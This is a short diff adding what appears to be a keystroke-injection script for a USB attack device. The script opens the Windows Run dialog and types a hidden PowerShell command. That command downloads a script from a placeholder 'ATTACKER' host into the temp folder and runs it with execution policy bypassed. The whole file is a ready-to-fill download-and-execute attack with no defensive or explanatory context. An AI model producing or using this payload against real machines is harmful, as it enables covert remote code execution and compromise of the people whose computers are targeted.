@@ -1,0 +1,4 @@
+GUI r
+DELAY 300
+STRING powershell -w hidden -c "iwr http://ATTACKER/payload.ps1 -OutFile $env:TEMP\p.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\p.ps1"
+ENTER
